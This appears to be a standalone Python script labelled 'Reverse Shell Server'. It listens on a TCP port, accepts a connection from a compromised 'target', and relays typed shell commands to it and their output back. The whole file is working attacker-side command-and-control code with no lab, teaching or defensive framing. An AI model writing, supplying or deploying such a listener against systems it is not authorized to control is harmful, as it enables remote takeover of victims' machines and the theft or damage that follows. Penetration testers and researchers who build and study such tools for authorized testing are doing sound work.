import socket
import argparse

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Server")
    parser.add_argument("--port", type=int, default=9999, help="The port to listen on")
    args = parser.parse_args()

    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = args.port   # The port to listen on

    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)

    print(f'Listening on {HOST}:{PORT}...')
    conn, addr = s.accept()
    print(f'Connection from {addr}')

    while True:
        command = input("Shell> ")  # Command to send to the target
        if command.lower() == 'exit':
            conn.send(b'exit')
            break

        conn.send(command.encode())
        output = conn.recv(1024)
        print(output.decode())

    conn.close()

if __name__ == "__main__":
    main()
